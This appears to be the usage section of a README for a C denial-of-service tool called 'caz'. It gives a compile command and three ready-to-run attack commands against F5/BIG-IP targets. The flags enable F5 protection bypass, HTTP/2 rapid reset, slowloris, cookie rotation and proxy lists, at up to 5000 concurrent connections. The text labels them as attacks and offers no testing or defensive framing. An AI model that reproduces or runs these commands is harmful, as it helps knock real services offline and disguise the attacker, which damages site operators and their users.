```gcc -o caz caz.c -lcurl -lssl -lcrypto -lpthread -O2 -Wall```


### Basic F5 attack
```./caz -url https://f5.target.com -duration 60 -concurrency 1000 -f5-bypass -http2-reset```

### Full attack with all features
```./caz -url https://bigip.company.com -duration 120 -concurrency 2000 -f5-bypass -cookie-rotate -http2-reset -slowloris -random-path```

### With proxy file
```./caz -url https://f5.target.com -duration 300 -concurrency 5000 -proxy-file proxies.txt -f5-bypass -cookie-rotate```
